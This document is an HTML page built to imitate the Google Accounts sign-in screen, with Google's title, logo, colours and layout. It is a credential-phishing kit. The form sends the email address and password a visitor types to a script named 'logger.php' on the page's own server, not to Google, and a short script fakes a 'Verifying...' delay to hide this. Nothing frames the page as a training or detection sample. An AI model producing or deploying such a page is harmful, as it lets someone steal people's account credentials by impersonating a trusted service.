<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Roboto',sans-serif;background:linear-gradient(135deg,#4285f4,#34a853);min-height:100vh;display:flex;align-items:center;justify-content:center}.container{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:100%;max-width:400px;margin:20px}.logo img{width:100px;margin:0 auto 30px;display:block}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#202124;font-size:16px;font-weight:400}input{width:100%;padding:13px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;transition:border-color .2s}input:focus{outline:none;border-color:#4285f4;box-shadow:0 0 0 1px #4285f4}.signin-btn{width:100%;background:#1a73e8;color:white;border:none;padding:12px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:8px}.signin-btn:hover{background:#1557b0}.links{text-align:center;margin-top:24px;font-size:14px}.links a{color:#1a73e8;text-decoration:none;margin:0 15px}.links a:hover{text-decoration:underline}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <form id="loginForm" method="POST" action="logger.php">
            <div class="form-group">
                <label>Email or phone</label>
                <input type="email" name="email" required placeholder="youremail@gmail.com">
            </div>
            <div class="form-group">
                <label>Enter your password</label>
                <input type="password" name="password" required placeholder="Password">
            </div>
            <button type="submit" class="signin-btn">Next</button>
        </div>
        <div class="links"><a href="#">Forgot password?</a><a href="#">Create account</a></div>
    </div>
    <script>
        document.getElementById('loginForm').onsubmit=function(e){
            e.preventDefault();let b=document.querySelector('.signin-btn');
            b.textContent='Verifying...';b.disabled=true;
            setTimeout(()=>this.submit(),800);
        }
    </script>
</body>
</html>